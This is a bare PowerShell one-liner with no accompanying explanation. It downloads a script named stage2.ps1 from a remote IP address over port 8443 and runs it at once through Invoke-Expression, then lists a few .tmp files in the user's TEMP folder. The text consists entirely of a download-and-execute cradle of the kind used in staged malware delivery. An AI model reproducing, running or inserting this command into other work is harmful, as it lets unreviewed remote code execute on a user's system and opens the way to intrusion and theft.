Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://192.0.2.120:8443/stage2.ps1'); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
